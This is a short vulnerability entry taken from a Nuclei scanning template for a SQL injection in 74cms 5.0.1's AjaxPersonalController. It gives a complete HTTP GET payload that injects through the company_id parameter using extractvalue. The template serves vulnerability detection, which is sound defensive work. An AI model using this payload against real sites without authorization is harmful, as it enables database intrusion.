# Nuclei Template: 74cms Sql Injection
**Template ID:** 74cms-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`74cms-sqli.yaml`)

## Vulnerability Information & PoC

## Description
A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test") and extractvalue(1,concat(0x7e,md5({{num}}))) -- a
```

## References
- https://github.com/possib1e/vuln/issues/3
